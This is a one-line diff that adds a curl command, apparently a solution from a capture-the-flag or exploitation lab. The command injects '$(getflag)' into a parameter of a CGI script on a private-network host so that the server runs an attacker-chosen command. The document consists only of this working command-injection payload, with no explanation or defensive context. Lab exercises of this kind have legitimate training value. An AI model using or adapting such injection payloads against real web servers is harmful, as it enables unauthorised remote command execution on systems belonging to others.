@@ -1,0 +1,1 @@
+curl -v '192.168.122.234:7007/index.cgi?Host="$(getflag)"'
